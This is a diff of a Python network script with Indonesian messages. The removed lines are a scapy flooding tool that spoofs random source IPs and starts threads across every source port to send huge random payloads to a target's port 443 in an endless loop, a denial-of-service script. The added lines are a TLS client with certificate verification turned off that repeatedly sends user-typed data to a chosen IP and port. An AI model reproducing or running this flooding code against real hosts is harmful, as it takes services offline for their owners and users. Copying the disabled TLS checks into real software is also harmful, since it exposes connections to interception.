@@ -1,61 +1,83 @@
-import random
-import string
-from scapy.all import *
-import threading
+import socket
+import ssl
 import time
 
 
-def send_large_packet(
-    source_IP, target_IP, source_port, data_size_bytes, packet_delay=0.01
-):
-    IP1 = IP(src=source_IP, dst=target_IP)
-    TLS1 = TLS()
-    TCP1 = TCP(sport=source_port, dport=443)
-    data = "".join(
-        random.choice(string.ascii_letters) for _ in range(data_size_bytes)
-    )  # Mengubah ukuran data menjadi byte
-    pkt = IP1 / TCP1 / TLS1 / data
+class ServerConnection:
+    def __init__(self, ip, port, use_tls=False):
+        self.ip = ip
+        self.port = port
+        self.use_tls = use_tls
+        self.ssl_client_socket = None
 
-    try:
-        send(pkt, inter=packet_delay, verbose=0)  # Tambahkan penundaan di sini
-    except Exception as e:
-        print(f"Terjadi kesalahan saat mengirim paket: {e}")
+    def open_connection(self):
+        try:
+            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            if self.use_tls:
+                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                self.ssl_client_socket = context.wrap_socket(
+                    self.client_socket, server_hostname=self.ip
+                )
+            else:
+                self.ssl_client_socket = self.client_socket
+
+            self.ssl_client_socket.connect((self.ip, self.port))
+            print(
+                f"Terhubung ke {self.ip}:{self.port} dengan SSL/TLS"
+                if self.use_tls
+                else f"Terhubung ke {self.ip}:{self.port}"
+            )
+
+        except Exception as e:
+            print(
+                f"Gagal terhubung ke {self.ip}:{self.port} dengan SSL/TLS. Kesalahan: {str(e)}"
+            )
+
+    def send_data(self, data, repeat=1):
+        try:
+            for i in range(repeat):
+                # Mengirim data ke server
+                self.ssl_client_socket.send(data.encode("utf-8"))
+
+                # Menerima data dari server
+                received_data = self.ssl_client_socket.recv(1024).decode("utf-8")
+                print(f"Data yang diterima dari server: {received_data}")
+
+        except Exception as e:
+            print(
+                f"Gagal mengirim atau menerima data ke/dari {self.ip}:{self.port}. Kesalahan: {str(e)}"
+            )
+
+    def close_connection(self):
+        self.ssl_client_socket.close()
+        print(
+            f"Koneksi ke {self.ip}:{self.port} dengan SSL/TLS ditutup"
+            if self.use_tls
+            else f"Koneksi ke {self.ip}:{self.port} ditutup"
+        )
 
 
 def main():
-    target_IP = input("Masukkan alamat IP Target: ")
-    num_threads = 100  # Jumlah thread yang digunakan untuk mengirimkan paket
-    data_size_gb = 1  # Ukuran data dalam gigabyte
-    data_size_bytes = data_size_gb * 1024 * 1024 * 1024
+    ip = input("Masukkan alamat IP target: ")
+    port = int(input("Masukkan port target: "))
+    use_tls = input("Gunakan TLS (y/n)? ").strip().lower() == "y"
+    data_to_send = input("Masukkan data yang ingin dikirim: ")
+    repeat = int(input("Berapa kali data akan dikirim: "))
 
-    i = 1
-    while True:
-        a = str(random.randint(1, 254))
-        b = str(random.randint(1, 254))
-        c = str(random.randint(1, 254))
-        d = str(random.randint(1, 254))
-        dot = "."
-        source_IP = a + dot + b + dot + c + dot + d
+    server_connection = ServerConnection(ip, port, use_tls)
+    server_connection.open_connection()
 
-        source_ports = range(1, 65535)
-        threads = []
-
-        for source_port in source_ports:
-            thread = threading.Thread(
-                target=send_large_packet,
-                args=(source_IP, target_IP, source_port, data_size_bytes),
-            )
-            threads.append(thread)
-
-        for thread in threads:
-            thread.start()
-
-        for thread in threads:
-            thread.join()
-
-        print(f"Paket terkirim {i} (Ukuran: {data_size_gb} GB)")
-        i += 1
-        time.sleep(30)
+    try:
+        while True:
+            server_connection.send_data(data_to_send, repeat)
+            time.sleep(1)  # Menunggu 1 detik sebelum mengirim lagi
+    except KeyboardInterrupt:
+        # Tangani jika pengguna menekan Ctrl+C
+        pass
+    finally:
+        server_connection.close_connection()
 
 
 if __name__ == "__main__":
